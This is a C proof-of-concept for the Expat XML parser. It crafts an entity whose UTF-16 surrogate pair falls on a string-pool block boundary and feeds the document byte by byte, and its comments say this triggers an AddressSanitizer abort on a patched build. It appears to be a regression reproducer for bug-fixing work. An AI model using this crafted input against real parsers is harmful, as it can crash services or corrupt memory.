/* PoC: UTF-16 (XML_UNICODE) build, entity replacement text with a non-BMP
 * character landing exactly on the internal string-pool block boundary,
 * fed to XML_Parse in small pieces.
 *
 * The document below declares a general entity whose replacement text is
 * 1023 ASCII letters followed by U+1D11E (a 4-byte UTF-8 sequence that
 * converts to a UTF-16 surrogate pair).  Converted into the DTD entity
 * value pool, the single-unit characters exactly fill the pool's first
 * 1024-unit block, leaving room for one more unit when the surrogate
 * pair is converted.
 *
 * Parses cleanly (exit 0) on the parent revision; aborts under
 * AddressSanitizer on the patched tree.
 */
#include <stdio.h>
#include <string.h>

#include "expat.h"

static size_t
append(char *dst, size_t off, const char *src) {
  const size_t n = strlen(src);
  memcpy(dst + off, src, n);
  return off + n;
}

int
main(void) {
  static char doc[2100];
  size_t off = 0;
  size_t len;
  size_t pos;
  enum XML_Status status = XML_STATUS_OK;
  XML_Parser parser;

  off = append(doc, off, "<?xml version=\"1.0\"?>\n");
  off = append(doc, off, "<!DOCTYPE e [\n<!ENTITY ent \"");
  memset(doc + off, 'A', 1023);
  off += 1023;
  /* U+1D11E MUSICAL SYMBOL G CLEF as UTF-8 (converts to a surrogate pair) */
  doc[off++] = (char)0xF0;
  doc[off++] = (char)0x9D;
  doc[off++] = (char)0x84;
  doc[off++] = (char)0x9E;
  off = append(doc, off, "\">\n]>\n<e/>");
  len = off;

  parser = XML_ParserCreate(NULL);
  if (parser == NULL)
    return 2;

  /* Feed the document to the parser one byte at a time. */
  for (pos = 0; pos < len; pos++) {
    status = XML_Parse(parser, doc + pos, 1, XML_FALSE);
    if (status == XML_STATUS_ERROR)
      break;
  }
  if (status != XML_STATUS_ERROR)
    status = XML_Parse(parser, "", 0, XML_TRUE);

  fprintf(stderr, "status=%d error=%d\n", (int)status,
          (int)XML_GetErrorCode(parser));
  XML_ParserFree(parser);
  return status == XML_STATUS_ERROR ? 1 : 0;
}
